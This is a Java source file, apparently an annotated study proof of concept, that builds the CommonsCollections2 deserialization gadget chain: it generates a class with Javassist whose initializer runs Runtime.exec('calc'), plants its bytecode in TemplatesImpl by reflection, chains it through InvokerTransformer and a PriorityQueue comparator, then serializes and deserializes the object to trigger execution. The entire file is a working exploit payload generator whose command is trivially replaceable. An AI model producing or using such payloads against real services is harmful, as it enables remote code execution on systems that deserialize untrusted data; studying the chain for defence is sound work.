package org.dili.cc;

import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

public class commons_collections2 {
    public static void main(String[] args) throws Exception {
        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";

        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
        CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime

        byte[] bytes=payload.toBytecode();//转换为byte数组

        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
        field.setAccessible(true);//暴力反射
        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组

        Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
        field1.setAccessible(true);//暴力反射
        field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test

        InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});
        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
        PriorityQueue queue = new PriorityQueue(2);//使用指定的初始容量创建一个 PriorityQueue，并根据其自然顺序对元素进行排序。
        queue.add(1);//添加数字1插入此优先级队列
        queue.add(1);//添加数字1插入此优先级队列

        Field field2=queue.getClass().getDeclaredField("comparator");//获取PriorityQueue的comparator字段
        field2.setAccessible(true);//暴力反射
        field2.set(queue,comparator);//设置queue的comparator字段值为comparator

        Field field3=queue.getClass().getDeclaredField("queue");//获取queue的queue字段
        field3.setAccessible(true);//暴力反射
        field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
        outputStream.writeObject(queue);
        outputStream.close();

        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
        inputStream.readObject();

    }
}

